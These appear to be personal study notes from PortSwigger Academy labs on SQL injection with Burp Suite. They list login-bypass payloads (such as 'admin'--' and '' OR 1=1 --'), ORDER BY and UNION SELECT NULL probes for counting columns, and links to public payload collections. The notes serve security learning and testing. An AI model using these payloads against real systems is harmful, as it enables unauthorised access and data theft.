# burpSuite
aka Notes from PortSwigger Academy

## SQLi

- ```--``` comments out everything after

Payloads that just worked somewhere:
```
'--
admin'--
administrator'--
' OR 1=1 --
'+OR+1=1--
OR 1=1 --
OR+1=1 --
```
So how many collumns do we have? 
```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
'+ORDER+BY+3--

' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
'+UNION+SELECT+NULL,+NULL--
'+UNION+SELECT+NULL,NULL--
```

- [payloads](https://github.com/payloadbox/sql-injection-payload-list#generic-sql-injection-payloads)
- [payloads2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
